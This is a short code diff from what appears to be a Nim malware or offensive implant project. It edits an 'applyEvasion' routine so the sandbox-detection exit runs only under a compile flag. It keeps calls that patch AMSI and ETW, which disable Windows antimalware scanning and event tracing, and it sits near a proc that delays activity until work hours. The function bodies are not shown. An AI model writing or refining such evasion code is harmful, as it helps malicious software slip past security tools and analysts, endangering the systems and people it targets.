@@ -240,7 +240,8 @@ proc sleepUntilWorkHours*() =
 
 # ── Apply all evasion at startup ──────────────────────────────────────────────
 proc applyEvasion*() =
-  sandboxCheck()     # exit early if sandbox / analysis env detected
+  when defined(SandboxChecks):
+    sandboxCheck()   # exit early if sandbox / analysis env detected
   patchAMSI()
   patchETW()
   disableETWProcess()
